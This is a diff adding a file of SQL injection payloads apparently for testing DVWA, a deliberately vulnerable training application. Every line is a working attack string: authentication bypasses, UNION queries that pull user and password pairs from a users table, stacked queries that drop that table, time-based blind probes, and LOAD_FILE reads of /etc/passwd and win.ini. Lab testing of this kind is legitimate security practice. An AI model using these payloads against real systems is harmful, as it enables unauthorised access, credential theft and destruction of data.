@@ -1,0 +1,83 @@
+# ============================================
+# SQL INJECTION PAYLOADS - DVWA Testing
+# ============================================
+
+# BOOLEAN-BASED INJECTION
+' OR '1'='1
+' OR '1'='1' --
+1 OR 1=1
+1' OR '1'='1
+' OR 1=1--
+
+# UNION-BASED INJECTION
+' UNION SELECT NULL, NULL--
+' UNION SELECT database(), user() --
+' UNION SELECT version(), @@hostname --
+' UNION SELECT user, password FROM users --
+1 UNION SELECT @@version, database()
+1 UNION SELECT user(), database()
+1 UNION SELECT NULL, @@version --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --
+
+# ERROR-BASED INJECTION
+1' AND extractvalue(1, concat(0x7e, version()))--
+1' AND updatexml(1, concat(0x7e, version()), 1)--
+
+# TIME-BASED BLIND INJECTION
+1' AND SLEEP(5)--
+1' AND IF(1=1, SLEEP(5), 0)--
+' OR SLEEP(5)--
+
+# STACKED QUERIES
+1'; DROP TABLE users --
+1'; SELECT * FROM users; --
+
+# COMMENT BYPASS
+1' OR 1=1 --
+1' OR 1=1 /*
+1' OR '1'='1' -- 
+1 OR 1=1 --
+
+# INFORMATION SCHEMA ENUMERATION
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --
+1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()
+' UNION SELECT NULL, CONCAT(table_name, ':', column_name) FROM information_schema.columns WHERE table_schema=database() --
+
+# DATA CONCATENATION
+' UNION SELECT NULL, CONCAT(user, ':', password) FROM users --
+' UNION SELECT CONCAT(user, '|', password), NULL FROM users --
+
+# VERSION DISCLOSURE
+' UNION SELECT @@version, NULL --
+' UNION SELECT version(), NULL --
+1' UNION SELECT @@version, NULL --
+
+# DATABASE INFORMATION
+' UNION SELECT database(), NULL --
+' UNION SELECT schema_name, NULL FROM information_schema.schemata --
+' UNION SELECT NULL, @@datadir --
+
+# FILE SYSTEM ACCESS (If Privileges Allow)
+' UNION SELECT NULL, LOAD_FILE('/etc/passwd') --
+1' UNION SELECT NULL, LOAD_FILE('C:/Windows/win.ini') --
+
+# AUTHENTICATION BYPASS
+admin' --
+admin' OR '1'='1
+' OR '1'='1' LIMIT 1 --
+admin' -- 
+' UNION SELECT 'admin', '5f4dcc3b5aa765d61d8327deb882cf99' --
+
+# NUMERIC INJECTION
+1 OR 1=1
+999 OR 1=1
+-1 OR 1=1
+0 OR 1=1
+
+# LIKE CLAUSE INJECTION
+%' OR '1'='1
+_' OR '1'='1
+%' OR 1=1 --
+
+# SECOND ORDER INJECTION
+' UNION SELECT (SELECT password FROM users LIMIT 1), NULL --
